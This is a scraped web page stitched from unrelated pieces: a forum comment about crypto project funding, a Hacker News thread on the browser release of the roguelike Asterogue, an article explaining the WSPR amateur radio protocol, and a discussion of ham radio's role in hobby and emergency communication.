I worked with some pioneers in the space who collected millions from the very early days and were within their rights to use those funds as they saw fit but they were coerced/forced into creating non-profit entities to hold the funds (the fact that they were forced was common knowledge at the time it happened) and then they started pouring money down the drain, actively preventing development of the tech and slandering/defaming anyone who tried to improve things. It culminated in them essentially redirecting all raised development funds towards their biggest competitor! This is all public info BTW and could easily be proved in court... Great, if you aren't worried about 'hidden' ramifications! Anyway, all this was done with the explicit approval of government entities. I saw all this happen in real time. Also, one telltale sign is that they were allowed to get away with stuff which I later learned would have been in violation of regulations. This was a very high profile project that reached 3 billion+ market cap. It didn't fall under the radar. The government knew the whole time and was involved in all decisions. I also saw some scam projects receive repeat funding from EU government entities in spite of having failed to deliver anything. Then they raised more funds for later projects. reply talldayo 20 hours agorootparentprev> but immediately suggesting that they kidnapped themselves without any other evidence is insane. Insane, or a famous form of security fraud that is mitigated by centralized banking systems and therefore highly attractive for crypto-owners. It's a heads-I-win tails-you-lose situation.

You descend 17 levels into the heart of an asteroid to find The Orb and save the universe. There are a bunch of different monsters which get progressively harder as you descend. Instead of magic there is technology and you can pick up nanotech items and beakers of chemicals to buff your character (or hurt them if you get unlucky). I built Asterogue over the course of a couple of months while I was bored on a break from work due to illness. The game was always built with web tech but I only released it on Android and Windows at first because that seemed to be the right way to release a game. Well I recently realized maybe the right way is the wrong way. Maybe this web thing really is catching on. So now I'm trying out a web release to see if I can make it easier for more people to play Asterogue. So far this is working well and the game is getting more daily players than it ever did as a native app, which I'm very grateful for! For the web based version I am trying a new payment model. The original Asterogue was like most other games in that you simply buy it in the app store or on Itch and download the game. This time around I am trying a new experiment with this and instead of buying a downloadable binary, you can play the first few levels free in your browser and then you pay one-time to unlock the full game online if you want to continue. I think this strikes a nice balance for players as you get to try it out and only continue if you're actually into the game once you have picked up the vibe. I haven't really seen this done before with web based games so it's all a bit of an experiment. This release also includes a bunch of fixes and new features based on feedback I received from players after the native version was release. Anyway, I hope you enjoy my little roguelike game. Have fun! reply modeless 1 hour agoparentGlad to see more web games! The zero install/instant load aspect is such a huge advantage for the web.

I recently discovered this very polished (despite the cartoony graphics) battle royale: https://gooberdash.winterpixel.io/ and the creator has an HN post describing how they did it (Godot with wasm threads): https://news.ycombinator.com/item?id=40372308 Another good source on the technical aspects of porting to the web is Sebastian Altonen, a very good graphics programmer who works at a company called HypeHype doing a kind of TikTok-but-Roblox hybrid. He is currently porting from WebGL to WebGPU and posting a lot about it here: https://x.com/SebAaltonen reply animex 53 minutes agoparentprevWould love to hear a bit about the tech stack or engine you used (if any)! reply joshstrange 5 hours agoparentprevQuick question, does purchasing the game from your website also give you the windows version as well? I’d like to see if I can run it on my steam deck but it’s not clear to me if you only get the browser version or not. The Itch.io page for your game mentions the windows and Linux packages (and it’s cheaper?) so I wanted to check before buying. reply chr15m 4 hours agorootparentNo it is only for access to the web version at this point, sorry! reply codingbot3000 3 hours agoparentprevIt is fun, nice one :-) reply jbellis 4 hours agoprevOn the subject of scifi roguelikes, I've sunk 700+ hours into Jupiter Hell. I've been playing roguelikes since the original Rogue in the 80s and I think JH is the GOAT: skill tree that rewards experimentation, learning curve that never feels unfair, and that \"just one more level\" itch propelling you forward. Add in a fresh take on ranged combat mechanics, a strip-it-to-essentials design (a winning run takes me ~3h on Ultraviolence), and a legitimately good custom 3D engine, and you have something that I think will be recognized as a classic for years. https://store.steampowered.com/app/811320/Jupiter_Hell/ reply j_crick 1 hour agoparentQuite surprised to see JH mentioned here, it's a great game! Also in some way it reminds me of Heat Signature, which is not the same game at all, and yet somehow has the same kind of vibe for me. reply swayvil 4 hours agoparentprevYou are me. Will check JH. Thanks. reply kemotep 5 hours agoprevChris is also the developer behind rogule[0], a daily roguelike dungeon in a similar style as wordle or tradle type games. Absolutely been enjoying it the past year. [0]: https://rogule.com/game.html reply n4r9 4 hours agoparentSecond that. Been roguling almost daily. It's great although I'm now finding it's either a bit too easy, or impossible. reply chr15m 4 hours agorootparentGlad you're enjoying Rogule, thanks for playing! It's amazing to me how often I hear things like this even though the level gen hasn't changed. I think maybe what happens is people get really good at it and can then only be defeated by really hard levels or unlucky combat rolls. reply skarlso 4 hours agorootparentprevExactly. Sometime I’m surrounded completely without changes of going around something with two three level 5-6 creatures in the beginning at level 3. reply johtso 1 hour agoprevLoving it so far! My only comment is that it feels like there are too many items for the amount of inventory space. There will be rooms completely littered with boots that you just walk past. Every time you see something interesting like a potion you have to first chuck away a pair of boots before you can pick it up and drink it. reply pmontra 15 minutes agoprevA nice game. But when I drop something by clicking on the red X button, the item should drop to my feet and not become permanently lost. If the game can't stack items, it could go in a random nearby space. If there are no empty spaces, I can accept that I can't drop it. Oh, I didn't check if monsters can step above items. reply CatAtHeart 3 hours agoprevOne suggestion is to allow for HJKL or WASD movement. Arrow keys are fine and intuitive, but not in the best location. I remember playing nethack years ago and it had the HJKL system. reply jamalaramala 1 hour agoprevOne thing that I really liked was the \"discoverability\" of the user interface. I started to walk around, picking things up. Then, I noticed a little \"i\" on the bottom left. I typed \"i\", and it opened the inventory. Very good! Now, the \"i\" was replaced by an \"x\". I really expected that \"x\" would close the inventory... but it didn't. :-( Unless the \"x\" letter is reserved for something important, it would be nice if it could be used to close dialogs! reply themanmaran 1 hour agoparentAlso wish \"i\" wasn't the only way to open inventory. It feels awkward having to move my hand from \"i\" to the top row numbers, then back to the arrow keys. reply gavmor 29 minutes agoprevWow, wonderful! Love the rendition of \"Jupiter\". Really a delightful experience. On mobile, I'd prefer movement on the left, and inventory on the right. reply bryceneal 2 hours agoprevI enjoyed it, though for my taste it was maybe a little too simplistic and easy. The original rogue is before my time, but at one point I got very hooked on brogue (https://sites.google.com/site/broguegame/) and this reminded me very much of that. reply j_crick 1 hour agoprevI've been Rogule-ing for so long that I'll just buy it as a big thank you. Also, why the gear cannot be dropped and only destroyed? :( reply cengen 5 hours agoprevGreat game! I like to experiment with different game frameworks myself (currently on pico8). What \"web tech\" did you use to build it? reply debo_ 5 hours agoparentIt gives you a list of the tech in the About section when you first start the game. reply cengen 5 hours agorootparentAha thanks! reply chr15m 4 hours agoparentprevIt's HTML, CSS, and vanilla JS (except for the ROT.js library which is fantastic!). reply debo_ 5 hours agoprevI love the aesthetic. Couple nits: I have no idea how I expected the browser back button to work, but whatever it did do surprised me a bit. During gameplay, it might be nice to have an \"are you sure you want to go back?\" before it exits. I'd recommend running spell check on your in-game messages. I already saw \"Weilding X\" instead of \"Wielding X\" I'll give it a further go. reply chr15m 4 hours agoparentI just grepped the source and wow, literally every instance of wielding is spelled wrong, including variable names. I've updated it, thank you (will push it once HN is done thrashing my VPS). Will also have a think about how to improve the back button thing! reply debo_ 3 hours agorootparentAt least you're consistent! :) reply debo_ 3 hours agorootparentprevI just did a quick run down to the paywall, and it's fun! Good coffeebreak game, and I like the vibe a lot. I'll buy it shortly. I'm not sure if more mechanics show up later in the game, but this feels like the kind of game that needs traps or other landscape threats, even if they're 100% detectable. Maybe there are cooler / more complicated items coming, but the tactics so far are pretty light. I personally also have qualms about tiled roguelikes that don't let you move/attack on diagonals, but I understand wanting to keep the keyset simple. I was a bit confused by the sight radius at first, because it was hard for me to distinguish which parts of the map were uncovered and which parts were covered but black because of the background. I wonder if you could add some sort of transparent \"fog\" or something over unsighted areas, so that you still see the space background but also make it clear that tiles have not been sighted. Hopefully this stuff helps. reply jcalabro 5 hours agoprevLove the 8-bit Holst :) reply Rhapso 5 hours agoprevSound settings should not wrap back around to max when you hit the \"volume down\" button a lot. reply chr15m 4 hours agoparentThanks, will fix! reply cassianoleal 5 hours agoprevProbably not related to this game exclusively but whenever I click on the screen, Firefox selects the canvas and the entire map gets a blue screen on top.

Possibly I was just being oblivious, but I eventually tried moving sideways onto what I thought was a slightly odd looking wall segment (I wish I remembered what exactly made me think it looked odd), and suddenly I was on the next level. I don't know whether somehow the stairs icon just blended in with the walls unexpectedly well and I managed to not recognize it in that context (which seems possible but hard for me to believe, given how much time I spent walking in circles looking for stairs), or whether something odd was going on with the icon being different or distorted for some reason. reply xivusr 3 hours agoprevLove the music retro look and feel. Awesome work here! reply hmcq6 6 hours agoprevIt was pretty jarring when the game stopped 3 levels in to ask me for money. I guess it technically says \"3 free levels\" on the splash screen. Perhaps OP could use the word \"demo\" somewhere in this post. reply sigseg1v 5 hours agoparentI think something about the timing of it feels off to me as well. I'm no stranger to payment screens; I grew up playing shareware floppies. I think the difference is that, let's take a game like Monster Bash for example: you can play up until you beat the first boss, and it feels pretty epic, and then there is a splash screen after the epic boss fight which is essentially a \"You think that was awesome? Want more? Mail us at XYZ for Episodes 2, 3 and 4 to discover the rest of the journey.\" I totally mailed them and had to have more of that. For this I'm not sure because I don't suggest changing the game drastically, however it feels like there should be some epic fun thingfirst, usually after an hour or so, and then right after that is when you ask the player if they want more. In order for them to pay they would probably need to feel like they already got a very good amount for free and that they now feel generous. This is a cute game but I'm not getting that feeling so I struggle with this. For the creator: please don't take this as anything negative about the game! It's fun and I like it. But monetization is hard and I'm just offering my previous experiences where I've personally seen it work successfully. reply chr15m 5 hours agoparentprevThanks for the feedback, I will update the landing page with make it clearer the full game is paid. I also added this paragraph to my post which hopefully makes it clearer: > For the web based version I am trying a new payment model. The original Asterogue was like most other games in that you simply buy it in the app store or on Itch and download the game. This time around I am trying a new experiment with this and instead of buying a downloadable binary, you can play the first few levels free in your browser and then you pay one-time to unlock the full game online if you want to continue. I think this strikes a nice balance for players as you get to try it out and only continue if you're actually into the game once you have picked up the vibe. I haven't really seen this done before with web based games so it's all a bit of an experiment. Thanks for checking it out! reply dave333 2 hours agoparentprevWonder if OP has given any thought to an ad supported version for the cheapskates among us :-) reply imp0cat 3 hours agoprevGreat use of \"Jupiter\" by Gustav Holst on the main screen!

Posted by Elizabeth Klinc, KE8FMJ on June 7, 2024 at 1:43 pm Let’s start with the basics: WSPR stands for Weak Signal Propagation Reporter—a protocol implemented in a computer program used for weak-signal radio communication between hams. It lets users send and receive low-power transmissions for testing MF and HF propagation paths. Pronounced “whisper,” WSPR was designed and written initially by Nobel Prize winner and FT8 creator Joe Taylor, K1JT. The software code is now open source and updated by a small team. If you’ve wondered if a band is open, WSPR can tell you. (Image/Elizabeth Klinc, KE8FMJ) As noted by Joe Taylor, K1JT, and Bruce Walker, W1BW, in their November 2010 QST article, “WSPRing Around the World,” WSPR transmits and receives but does not support normal types of on-the-air conversation. It sends and receives specially coded, beacon-like transmissions which establish whether particular propagation paths are open. Transmissions convey a callsign, station location, and power level using a compressed data format with strong forward error correction (FEC) and narrow-band, four-tone frequency-shift-keying (FSK). K1JT notes that FEC greatly improves chances of copy and reduces errors to an extremely low rate. The signal bandwidth is only 6 Hz. Combined with randomized time-sharing, this assures that dozens of WSPR signals can fit into a 200 Hz segment of each amateur band. The WSPR protocol is effective at signal-to-noise ratios as low as -28 dB in a 2500 Hz bandwidth, about 10 to 15 dB below the threshold of audibility. On most bands, typical WSPR power levels are 5W or less (sometimes significantly less). As the protocol has evolved, enhancements to WSPR have included upgrades in its decoder’s sensitivity, improved ability to handle larger numbers of signals in crowded sub-bands, and better detection of false decodes. To take advantage of WSPR on the amateur bands, you’ll need a radio (one with USB audio is preferred) and a computer with an Internet connection. As users have pointed out online, you don’t need to transmit. Your system can still report what it hears. The standard message is++ . For example, “KE8FMJ EM89 37” is a signal from station KE8FMJ in Maidenhead grid cell “EM89,” sending 37 dBm, or about 5.0W. Questions?

(onallbands.com)160 points by peter_d_sherman 18 hours agohidepastfavorite64 comments relistan 10 hours agoI’m licensed in both the United States and Ireland. As a software engineer and electronics hobbyist, I find so many interesting things in ham radio circles. And if you’ve never experimented with RF stuff, you are missing out on a lot of fun. WSPR is one of many experimental modes worth trying. Home built and simple software defined radios like the ATmega-based https://dl2man.de/ (tr)uSDX put HF radio bands in your pocket for under $75. I’ve used digital modes on that radio to reach people on their computers 3000 miles away on 5 watts. Give it a try and I think you’ll find it’s a lot of fun. reply contingencies 3 hours agoparentIf you like (tr)uSDX I'm working on a somewhat similar transceiver at the moment https://github.com/vk2diy/adxi as a means to familiarise myself with radio. Key differences: one cable instead of four, no screen/buttons/blinkenlights, designed for a metal 'tiffin' enclosure, USB-C power only, built-in USB hub and USB audio chipset, modular frequency-specific late-stage boards, fully open design and design documentation including KiCad sources, components, calculations, etc. reply slow_typist 7 hours agoparentprev+1 DL2MAN rocks. reply IgorPartola 16 hours agoprevI am really curious what the future of Ham radio looks like. I have several times in my life tried to explore this hobby but mostly was turned off from it by the fact that it didn’t seem to offer much compared to what I could do on the internet aside from using public spectrum. Don’t get me wrong, I think it is cool and I see the use case for emergency response situations. But the idea of the community just never struck the cord with me how other communities have (mostly old white dudes, it seems). Am I wrong? Is there a place for hams in the world where you can more quickly and reliably reach anyone from anywhere across the internet? reply wglb 16 hours agoparentThe Chicago Marathon has an association with the North Shore Radio Club to provide emergency communications. With so many people concentrated in a very small area, cellphones are not reliable. This has likely saved lives. The recent hurricane to hit North Carolina had enormous support from ham radio as evidenced by someone who lost all power and internet: https://qrper.com/2024/11/helene-aftermath-update-insurance-.... There were many instances there of power lines not being down, but simply not existing any more. A recently concluded event, called the CQ World Wide contest, had over 30,000 participants. A large station will make as many as 10,000 contacts in a 48 hour period exchanging basic information. Some countries call this \"Radio Sport\". A US-based contest, called Sweepstakes had been going on since 1930. A very fun event is called Field Day and takes place in June. It covers North America and participants set up emergency communication facilities as well as presenting ham radio to the public. A recently-formed activity called Parks On The Air encourages setting up often very temporary stations in parks across the world. Activity on this is nowadays quite high with all manner of awards. See https://pota.app/ for details and index to activities. A similar activity, called Summits on the Air (SOTA) has participants climbing peaks and putting them on the air. Some of the participants take up a challenge of building a portable station that weighs less than one pound, as some of the trails to get to the peaks require lots of hiking. Some of the more capable hams spend significant time and energy building stations, such as K3LR: http://www.k3lr.com/. This is one of the biggest stations in the world. One of the more significant challenges is to bounce signals off the moon and contact other hams. This is quite difficult and requires lots of RF power as well as serious antennas. The WSJTX set of protocols has made this easier, but not simple. There are also satellites that support two-way ham radio communication. See https://www.amsat.org/ for detailed information. There is an enormous amount of activity in building your own rigs, particularly low-powered rigs. See https://qrp-labs.com/ for example. There are many, as well as instructions on how to build them from components. Many of these are not possible to do on the internet. For example, contacting 10,000 other stations in a 48 hour period with point-to-point communication. Or bouncing signals off the moon. Adventurous souls often travel to nearly inaccessible locations to put them on the air. One recent example is an expedition to Bouvet https://en.wikipedia.org/wiki/3Y0J_Bouvet_Island_DXpedition. I had the fortune to go to Vanuatu in 2000 with a group from our club. An activity that is declining in popularity is to collect contacts with US counties, of which there are 3,007 in the US. The emphasis in this is contact with mobile stations from the counties. This is only a summary and there are many other activities and fields of interest in Ham Radio. It can simply do some things that are not feasible on the internet, and can support activities that the internet normally handles when thing go down. If you look at K3LR's web site, you can see his support of youth. reply wrycoder 15 hours agorootparentThanks for taking the time to write this up! My own interests are largely related to understanding EM physics and technology - Ham radio provided the conduit, pun intended. reply simonw 15 hours agorootparentprevOK, K3LR looks incredible. I found this video interview where the chap talks about their 14 antenna setups: https://www.youtube.com/watch?v=8MZmkRBhXLo reply wglb 15 hours agorootparentYep. It is amazing. I have a friend who operates one of the positions during CQWW SSB. Line noise and other RF noise is the bugaboo of ham radio operation, particularly in an urban area. Tim gave a talk at RSGB some time ago where someone asked him what the noise level was at his station. His answer was \"S 0\" even though he lives in a suburban area. He has excellent relationships with his neighbors. reply molticrystal 15 hours agorootparentprevWith the advancement of satellite technology, which can provide cell service even during natural disasters when traditional terrestrial communication infrastructure is disrupted, I wonder if amateur radio use in emergencies will be superseded. If I'm incorrect, I'd appreciate it if you could explain why. While I see amateur radio continuing to have value in educational and hobby contexts, I'm skeptical about its ongoing importance in emergencies , which seems to be a primary motivator for many enthusiasts. reply wglb 15 hours agorootparentAs one example, satellites won't help in situations such as marathons. The problem with marathons is the number of devices that are trying to access a limited spectrum. A satellite station will have bandwidth limitations as well, as its most likely use is through WiFi. The example in the QRPer article above indicates a different limitation. He did have a satellite dish for internet access, but there was no way to distribute that signal over multiple mile radius, which is what he did with both FM simplex and at some point with 2 meter repeaters. For such communication to work, all parties would need a dish. He invited neighbors to come over to use his internet service so they could make wifi calls to family. His daughters and wife staffed the FM channels, keeping the local net alive. reply jvanderbot 7 hours agorootparentTo be clear, HAM as backup for cell works because so few people use it. If it were insanely popular, HAM would be ironically less useful as a backup. reply techjamie 3 hours agorootparentHam frequencies aren't run as a free for all where everyone is trying to contest the frequencies. During communications, there is typically a person who controls the frequency, designating who should talk at any given time and keep things orderly. The same applies for emergency comms. reply FloatArtifact 6 hours agorootparentprevThat doesn't make any sense unless you're trying to say if it was more popular than cell phones, then it wouldn't be a backup. reply rocqua 9 hours agorootparentprevSatelite still is centralized, needing a core to handle billing and routing. In time of war, it is quite easy to disable, and it remains fragile due to complexity, whilst being in someone else's control. HAM radio is robust, has no outside dependency, and is fully in control of people using it. You just need to have the equipment, no ifs or buts. reply Cthulhu_ 10 hours agorootparentprevOne natural disaster is solar storms, which can take out sattelites; another possibility, to dial it up to over 9000, is that sattelites will be a likely target in WW3. Finally, sattelites and the tools to communicate with them are relatively expensive, while you can get e.g. a Baofeng hand radio for $20-$30. reply jimktrains2 15 hours agorootparentprevWill such a system handle a sudden demand nearing the maximum capacity of its terrestrial counterpart? That's really the crux of the issue: in an emergency public networks can be overwhelmed. Many county government agencies don't work with hams anymore because they have sat links and other communication available to them. I'm sure as technology progresses and it becomes feasible and affordable to give individual first responders satcom abilities, but I'm not sure that every person with a cell phone will be able to stabily access satcom in an emergency for a while yet. reply simonw 16 hours agoparentprevI have a Ham license precisely because of the emergency response side of things: I live on the California coast where we get storms that can cut off electricity and power (at which point mobile internet inevitably stops working too, either because of no power to the cell towers or because it gets overloaded with everyone who would usually be on their home WiFi)... and we also live under the threat of big earthquakes. So my wife and I got Ham licenses and joined our local ARES (Amateur Radio Emergency Service) group. (We also have a Starlink dish and a big battery.) reply eddythompson80 15 hours agoparentprevYou’re not wrong. The space for ham enthusiasm has been greatly diminished by the internet. Since its inception in the 1910s until maybe the 80s or even 90s, saying “I contacted a dude in Thailand and another in Poland last night from my shack in Nebraska” would have been such a flex! It would have attracted the interest of many nerds and engineering/science minded folks. Now a days it wouldn’t even make any sense to announce or mention that. You’ll have to qualify it with a lot of “oh but I didn’t use the internet, or any infrastructure. In fact I can do this with nothing more than a battery and my radio. Isn’t that cool?” And it’s cool, in a way, but only to those who are really care about the specifics. reply CraigJPerry 11 hours agoparentprev>> Am I wrong? Is there a place for hams in the world where you can more quickly and reliably reach anyone from anywhere across the internet? Amateur in this context just means non financial interest. It’s a hobby, maybe a bit like the technical (but not really the art-) aspects of film photography in a world of 100 megapixel digital cameras. For me, it’s just a science based hobby - study of propagation, signals processing techniques - I’m fascinated by reliable signal transmission just below the noise floor. It’s something that just should not be possible, like seeing in pitch black, except this case we’re hearing a signal that’s drowned out by noise. Utterly fascinating (the short version would be that you don’t send one weak but narrowly concentrated signal like wspr in the article, but instead you encode the signal in such a way that you send a wide band pattern. On the receiving side, you look at all the noise and you try to find correlation in power levels across the band with the shared set of patterns that can be transmitted. reply aiforecastthway 16 hours agoparentprevThe emergency response use-case feels SUPER contrived to me. I am not aware of any SAR teams in our area using HAM radios, and the only group I know of that does is... so old that they'd mostly be asking for help or needing to relay messages to people who (a) are physically fit enough to help but who also (b) don't listen on Ham spectrum. I think from a technical perspective the emergency use case has faded a lot since the early 90s. Since then, two things have happened that make use of Ham in emergency communications more of an \"excuse to use a cool toy\" than an actual necessary component of a solution. First, FRS / Part 95B. Second, and maybe primarily, satellite communications have come a long way. And even on the extreme off-chance that transmitting on Ham spectrum or using FRS outside of Part 95B is necessary... well... in an emergency situation... just fuckin' do it? So Ham exists for fun and for education. But even there, it seems to be losing relevance. I think, at some point, the spectrum reserved for Ham should be bifurcated and a portion of it should allow for (non-commercial) encrypted packet radio. I think doing so would make Ham relevant again and significantly advance the \"hobby/education/science/international goodwill\" goals. reply bityard 16 hours agorootparentI'm not an emcomm whacker but I think that take is too dismissive. Ham radio was a much more viable for emergency communications before cell phones, Internet, and FRS/GMRS/MURS. But we still get news stories about hams who provide vital communications every time there's a major tornado outbreak or hurricane. E.g. https://www.wired.com/story/hurricane-helene-milton-north-ca... Perhaps when all cell phones can reliably and routinely communicate with satellites, emcomm on ham radio won't have much purpose. But we're not there just yet. > a portion of it should allow for (non-commercial) encrypted packet radio If the message is encrypted, how can anyone tell whether it is commercial or not? reply aiforecastthway 16 hours agorootparent> I'm not an emcomm whacker but I think that take is too dismissive. Ham radio was a much more viable for emergency communications before cell phones, Internet, and FRS/GMRS/MURS. Absolutely no disagreement! But I think that use-case is more-or-less dead. (The tool is perfectly good... it just doesn't have the network effects and usability of the other tools, and a combo of sats and FRS is good enough almost-always). > Perhaps when all cell phones can reliably and routinely communicate with satellites, emcomm on ham radio won't have much purpose. But we're not there just yet. True. But we are at the point where (a) satellite communication is extremely cheap, (b) authorities can be accessed via satellite as easily as 911 (or easier), and (c) people who can help but not official responders but in a place to help are WAY more likely to have satellite+FRS than Ham. (Eg most SAR teams either stick to FRS or deviate but don't even both licensing...) > If the message is encrypted, how can anyone tell whether it is commercial or not? I seriously don't think this will be a huge problem. 1. What's the point? There are cheaper and better solutions. Abuse will be minimal because infinitely simpler solutions just aren't that expensive these days. This was a very valid concern in the 80s, but it's not anymore. 2. Still require a call-sign unencrypted. Huge volumes from lots of different sources w/ the same call-sign such that it's ruining the amateur purpose of the use should be easy enough to investigate. If stations don't identify, well, that problem already exists and so do the solutions. BUT, if it does become a problem, you can solve it in a variety of ways. If congestion really becomes an issue after the rule change, it can be rolled back. Or the rules could be written with \"automatic triggers\" based on congestion. Or you could pre-empt by putting a maximum number of minutes per callsign per day. Etc. reply ElevenLathe 15 hours agorootparent> 1. What's the point? There are cheaper and better solutions. Abuse will be minimal because infinitely simpler solutions just aren't that expensive these days. This was a very valid concern in the 80s, but it's not anymore. I would like to point out that there has recently been an interest in HF spectrum for use shaving milliseconds off the ping of high-frequency trading firms, since skipping off the ionosphere on HF bands can be slightly faster than more reliable microwave or fiber links. There is licensing trouble (a good rundown of this is at https://computer.rip/2024-10-12-commercial-HF-radio.html) and I'm sure they would love to just use ham spectrum, even if it means paying a fine later after they've cleaned up in the markets. If this works, there will be more than enough demand for such connectivity to swamp the ham bands in encrypted digital junk. reply eternityforest 3 hours agorootparentprevI very much agree we could do better than ham for emergencies... But I don't expect an emergency hotline operator to be able to actually help anyone, that's not their job. I think we should go even further though, and make half of 70cm into ISM band with duty cycle limits, no license, commercial use allowed. Or maybe allow commercial use, but only with open protocols, so you can make an encrypted business radio, but only if you let others make a compatible one. Then hams could talk to their non ham friends. Getting a license isn't trivial if you're not already an embedded dev, and it's even more of a hassle now that it costs money. Being able to give someone a $20 radio that they could just use would be awesome. I don't think spectrum crowding is as much of an issue since people use wifi and 5g if possible for everything, aside from ultra slow long range stuff where everything uses lots of airtime. reply transcriptase 14 hours agorootparentprevWith all due respect… you’re wrong in the case of the vast majority of regions in North America that don’t have large city/municipal budgets and are mainly staffed by volunteers. In my area SAR and even fire departments actively communicate with various amateur radio groups. While quite a few public services such as paramedics, police, fire, etc are using newer trunked/digital technology, they’re keeping analog VHF/UHF systems adjacent to amateur bands as a fall back. In the case of rural volunteer services they have nowhere near the expertise or hardware capability of an even half serious ham, and many in the scene are former military comms guys who love to help out. It’s very rare that you’ll call on the 60 year old ham with his $25,000 station capable of using a rotating directional beam antenna to put out 1000 watts to relay a message to a team of emergency services who aren’t responding, but when you do and it saves a life you tend to see it as an advantage and not some guy waiting for an excuse to use his cool toy. Edit: and I’m not sure where the FRS mentions are relevant since it’s pretty far from being anything hams or emergency services would go near. Type certified radios with intentionally regulation-nerfed antennas and max 2 watt output are the definition of toys, and as a result only reach their advertised range under perfect conditions on the salt flats. reply wglb 16 hours agorootparentprevIt is not dead. Ham Radio was vital to the recovery of Helene, particularly in North Carolina. Major city marathons use Ham Radio where other services are overloaded. For an example, see https://www.hamradiochicago.org/about-us. Ham Radio was essential to the Red Cross effort in recovery from the 9/11 attacks. reply eddythompson80 15 hours agorootparentJust to be clear, saying “Vital” is overselling it, but it’s a nice thing to do. Being a ham operator is unpaid volunteer work, so over praise and “thanks” and calling it “vital” is really just being nice to a service someone provided that probably took 10-20 hours of their time for no compensation. It’s nice for an emergency response team to reach out to a local ham emergency group and just delegate to them “hey why don’t you operate this net on this repeater and let us know if anyone reaches out to you? hit us up on XYZ frequency when that happens? Ok thanks”. That’s one less task for a busy group to worry about. And if it saves or helps 1 person, then “it was vital in the rescue effort”. Heck, even if it doesn’t do anything “well it saved us from having a dedicated resource to just man a UHF/VHF repeater and keep announcing a net every 10 minutes, so it was ‘vital’ by freeing up 1 team member” In an emergency situation you can take any person off the street and give them a 5-minute primer on how to operate a radio. That’s really all it takes. They don’t need to know FCC rules, band plans, how radios are made, RF propagation properties, antenna theory, or any of that crap. “Tune to a frequency, push to talk, any questions?” reply amatecha 12 hours agorootparent\"how to operate a radio\", so when the station on the other end is like \"change to 146.58\" they'll definitely rememeber how to do that after a 5min primer during a regional disaster? Or when interference comes in (perhaps from a similarly-5min-trained rando), will they just toss the radio on the table and forget about it? Heck, how many vital comms will the person stomp over by not giving enough time for responses or urgent messages? Ever listened to nets and comms during disasters? the experience and expertise of the station operators is immediately clear. it's not something the average person can get the hang of in a few minutes. reply eddythompson80 11 hours agorootparentNon of that really applies to running an emergency net. A remote station isn’t gonna ask an emergency net operator to change frequency. In interference you would just politely ask the interferer to piss off. Most complicated scenario you’ll have to deal with is an asshole jamming you and switching to a backup frequency. Obviously experience helps, but you can also summarize 95% of what needs to be done in 5 or 10 minutes. And you don’t need 95% of what you usually study or learn for a ham license reply wglb 15 hours agorootparentprev> Just to be clear, saying “Vital” is overselling One of the motivations for the Chicago Marathon group to reach out to the ham club was was that in a previous year a runner died due to inadequate communication. I would call the prevention of that or even less serious health consequences Vital. > That’s really all it takes. I would put a strong disagree about this as well. You are leaving out a lot of the protocol for operation. This takes a bit of training and experience to be able to handle lots of situations, like when to talk, when to listen, and what to do if you are unsure if your communication has been received or not. reply eddythompson80 11 hours agorootparentThat’s the difficulty of it right? We’re just talking about what qualifies as “vital”. Is saving 1 life “vital”? I’m sure you, I, and most people would say yes. What else could you say? But it’s not likely to “move the needle” per se in a broader rescue effort. Ham radio is “vital” in emergency situations in the sense that it “could” help some people. But if it was really a needle mover, why is it left to volunteers and community best-effort to do? Why are we not demanding publicly funded rescue services to hold these roles instead? Because the ROI in terms of moving the needle of a rescue effort is just not there. An emergency net operated by amateur ham operators can last for hundreds of hours answer 800 questions, 780 of those are “how is it lookin’ out there?”, “any updates when this neighborhood is getting power back”, “this is Victor-Tango-7-Kilo-Kilo-India happy to help out folks if you need anything just holler”. Maybe 15 of someone actually reporting some useful update for a given value of usefulness and maybe 0-1 actual emergency stuff. It gives people with radios a place to vent without tying up actual rescue group resources answering and re-answering mundane questions. reply cdchn 13 hours agorootparentprevI've done Ham Radio operator stuff at a major metropolitan marathon multiple times and the Hams are really just there for data collection. Cell phones have no problems operating in ultra-dense environments any more. You could say \"what if the phones go down\" but in an emergency situation the professionals have their own trunked radios to use. reply mholt 14 hours agorootparentprevWe have a local SAR team that uses radios, and even emits APRS beacons.

Or gearheads w/ cars (you can just take a bus, airplane, etc or drive on the highway). Or raspberry Pi enthusiasts (dell will give you a perfectly good computer). You get the idea. It's the tinkering. If RF tinkering doesn't excite you, or if decentralized communication (truly decentralized - no other equipment but your own required!), then yeah, HAM may not be for you. As for the future - I'm quite excited about digital, and I can imagine something like layering more and more functionality on tiny digital protocols. You can already route emails. I'd love to see delay-tolerant networking ported to HAM, so that you can have offline \"couriers\" of data that automatically re-transmit when they connect. Then you could set up your vehicle as a \"mobile data mule\" when you drive through cities or across the country. reply amatecha 12 hours agoparentprevWell, with Winlink you can send emails to/from anywhere on the planet - I once sent an email via an RF relay in California (I'm in Vancouver, Canada). It could have been anywhere in NA though. Pretty sweet. There's a Winlink Wednesday \"net\" where people \"check in\" by sending a check-in winlink mail via RF to the net controller (organizer) who collects all the submissions and shares logs of all the participants.

It's fun, gets me out of the house and can be an interesting challenge depending on atmospheric conditions. I built a small kit radio (https://qrp-labs.com/qmx.html) for use when visiting some of the parks that have longer hikes to interesting areas. Building the radio was a great lesson in electronics and exposed how horrible my soldering skills were. My curiosity about how the SDR stuff worked, especially the transmitting side, led me to reading lots of great posts and information about RF, modulation, etc. The emergency preparedness side of things is an important side of amateur radio, but learning is an equally if not larger part of it. reply slow_typist 5 hours agorootparentCan relate with the learning part as the motivator. I would like to know whether you needed anything special for building the kit like e.g. an oscilloscope or other expensive instruments? reply geoffeg 4 hours agorootparentA good soldering iron, a magnifying glass (I have an articulating lamp with a built-in magnifying glass) and a basic multimeter is all that’s needed, but a clamp or “helping hands” to hold the circuit board would be helpful. reply bityard 16 hours agoparentprevAmateur radio rules and spectrum were carved out by the FCC for the purposes of advancing the science of radio, international goodwill, and building one's own skills. By definition, it is deliberately not \"useful\" (with the exception of emergency communications, as you point out) and that is very much by design. Making it useful would mean it could compete with commercial radio services, which the FCC does not allow. So we're left with, ham radio exists for science, fun, and the occasional rare emergency when all other communications are down. And that's okay! The hobby is deep and wide. No person can master it all. Every ham is on their own personal journey to dive down the rabbit holes that interest them. I'm personally about knee-deep in research for putting together a portable HF station that can operate a contest for the bulk of a weekend on just solar. I've put hours of reading into it and I still know practically nothing. And I'm loving every minute of it. If you've only encountered \"old white dudes\" in ham radio, you haven't gone very far. (I challenge you to find any skilled hobby that isn't represented by some population of old white dudes.) Most clubs accept members from anywhere if they have online meetings or nets, and the more urban and college-town clubs tend to be pretty diverse. There are clubs just for young people, there are clubs just for women. There are online communities which tend to be pretty welcoming and intolerant of rude behavior (hello 